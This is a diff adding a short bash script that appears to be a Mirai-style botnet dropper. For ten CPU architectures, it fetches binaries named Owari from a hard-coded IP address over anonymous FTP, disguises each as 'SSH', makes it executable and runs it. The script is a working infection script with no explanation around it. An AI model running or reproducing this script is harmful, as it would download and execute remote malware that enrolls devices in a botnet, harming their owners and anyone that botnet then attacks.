@@ -1,0 +1,13 @@
+#!/bin/bash
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.x86 Owari.x86;cat Owari.x86 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.mips Owari.mips;cat Owari.mips >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.mpsl Owari.mpsl;cat Owari.mpsl >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.arm4 Owari.arm4;cat Owari.arm4 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.arm5 Owari.arm5;cat Owari.arm5 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.arm6 Owari.arm6;cat Owari.arm6 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.arm7 Owari.arm7;cat Owari.arm7 >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.ppc Owari.ppc;cat Owari.ppc >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.m68k Owari.m68k;cat Owari.m68k >SSH;chmod +x *;./SSH
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 80.211.81.247 Owari.sh4 Owari.sh4;cat Owari.sh4 >SSH;chmod +x *;./SSH
